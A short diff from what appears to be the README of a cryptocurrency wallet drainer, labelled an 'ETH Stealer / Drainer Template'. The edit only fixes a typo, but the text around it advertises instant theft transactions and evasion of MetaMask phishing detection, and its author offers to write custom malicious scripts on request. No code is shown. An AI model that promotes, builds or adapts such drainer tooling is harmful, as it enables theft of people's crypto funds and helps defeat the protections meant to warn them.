@@ -8,5 +8,5 @@ ETH Stealer / Drainer Template !
  Instant transactions
  No contract required
  Anti Metamask Phishing Detections
-# INO:
+# INFO:
 the script has a clean code, no double wallets, in addition, I can prepare absolutely any script for you according to your desires
